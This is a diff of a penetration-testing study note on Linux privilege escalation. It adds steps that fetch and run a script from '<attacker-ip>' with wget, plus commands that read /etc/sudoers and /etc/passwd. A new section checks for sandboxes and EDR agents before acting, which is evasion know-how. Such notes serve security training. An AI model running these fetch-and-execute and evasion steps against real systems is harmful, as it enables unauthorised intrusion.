@@ -22,24 +22,31 @@ Gives you admin access and privileges to:
 * [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration).
 * [Linux Priv Checker](https://github.com/linted/linuxprivchecker).
 
-- To send any of these scripts to a target machine, spawn a python server on the attacking machine where the script is:
+There are several techniques to do this, this is also called [[Ingress Tool Transfer]].
+1. To send any of these scripts to a target machine, spawn a python server on the attacking machine where the script is:
 ```bash
 python -m http.server 80
 ```
-
-- Then `wget` the script.
+2. Then `wget` the script on the victim machine.
 ```shell
 wget http://<attacker-ip>:80/<scriptname.sh>
 ```
-
-- Before running the script, give it first execute permissions then run it.
+3. Before running the script, give it first execute permissions then run it.
 ```shell
 chmod +x <scriptname.sh>
 ./scriptname.sh
 ```
 
-#### Enumeration
+---
+### Manual Enumeration & Discovery
 
+##### Working Directory and Filesystem Layout
+- `pwd` prints the current working directory, confirming where on the filesystem the shell landed.
+- Listing the root directory shows the top-level layout and any non-standard or writable mount points.
+```bash
+pwd
+ls /
+```
 ##### Hostname
 - The hostname of a machine can give useful information about its role within the network.
 ```bash
@@ -60,6 +67,10 @@ cat /proc/version
 ```shell
 cat /etc/issue
 ```
+- `lsb_release -a` prints the distribution name, release number, and codename on distros that ship it.
+```shell
+lsb_release -a
+```
 ##### Running Processes
 - Running the command `ps` gives information about the currently running processes on the system.
 
@@ -75,6 +86,10 @@ ps axjf
 ```shell
 ps aux
 ```
+4. Live, continuously updating view of processes and resource usage.
+```shell
+top
+```
 ##### Environment Variables
  The `env` command can be used to show the environment variables.
  - The `PATH` variable could have a compiler or scripting language that we can use to run code or escalate privileges with.
@@ -84,6 +99,10 @@ echo $PATH
 ```
 ##### `sudo -l`
 Command used to list the commands that the current user can run using `sudo`.
+- Reading `/etc/sudoers` directly (if permitted) shows the full sudo policy, including rules for other users and groups.
+```shell
+cat /etc/sudoers
+```
 ##### Listing hidden files
 - Listing hidden files can show secret files, or [[Secure Shell Protocol (SSH)]] folders and keys.
 ```Shell
@@ -93,6 +112,10 @@ ls -lah
 - `id` command can be used to show the current user's privilege level and groups.
 ```shell
 id <username>
+```
+- `whoami` prints just the effective username, useful in scripts and after switching shells.
+```shell
+whoami
 ```
 ##### `/etc/passwd`
 Reading this file can help discover the users on a system.
@@ -105,12 +128,21 @@ cat /etc/passwd | cut -d ":" -f 1
 ```shell
 cat /etc/passwd | grep home
 ```
+##### Logged-in Users and Login History
+- `w` shows who is currently logged in and what they are doing, revealing active admins or other sessions.
+- `last` reads login history, exposing usernames, source hosts, and reboot patterns.
+```shell
+w
+last
+```
 ##### Command history
 The `history` command can be used to look at previous commands which could give us information about the system, and could store information such as usernames/passwords.
 ##### Network Interfaces
 The system might be pivoting, or connecting to another network.
 - The `ifconfig` command gives us information about the network interfaces of the system.
 - Use the command `ip route` to see the network routes that exist that we can reach. [[Networking/Routing|Routing]].
+- The `ip a` command lists interfaces and their addresses (the modern replacement for `ifconfig`); `ip r` is the short form of `ip route`.
+- The `arp -a` command shows the ARP cache (neighbor table), revealing other hosts recently contacted on the local segment.
 
 Can use the `netstat` command to check for existing interfaces and routes.
 
@@ -138,6 +170,12 @@ netstat -tpl
 ```shell
 netstat -i
 ```
+6. `ss` is the modern, faster replacement for `netstat`. List listening TCP sockets with the owning process, numeric, no name resolution.
+```shell
+ss -tnlp
+netstat -tnlp
+```
+- `-t` TCP, `-n` numeric (no DNS/port-name lookup), `-l` listening, `-p` owning process.
 ##### `find`
  
 Searching the system for specific files. [Guide](https://pimylifeup.com/find-command/).
@@ -177,6 +215,19 @@ find / -name perl*
 find / -name python*
 find / -name gcc*
 ```
+##### Cloud or Sandbox Discovery
+- Detecting virtualization or a sandbox tells you whether the host is a VM, container, or analysis environment, which shapes the escalation path and whether an **EDR** or sandbox agent is watching.
+- `systemd-detect-virt` reports the virtualization technology in use (e.g. `kvm`, `docker`, `lxc`, `oracle`) or `none` on bare metal.
+- `lsmod` lists loaded kernel modules; hypervisor guest modules (e.g. `vboxguest`, `vmw_balloon`) betray the platform.
+- `uptime` shows how long the host has been running; a very short uptime is typical of freshly spun sandboxes.
+- `pgrep` checks whether a named EDR or sandbox process is running before acting.
+```shell
+systemd-detect-virt
+lsmod
+uptime
+pgrep "<edr-or-sandbox>"
+```
+> A brand-new uptime, a hypervisor guest module, and a detached analysis agent together are strong signals you're in a sandbox, not on a real target.
 
 ---
 ### Using SUID and SGID bits
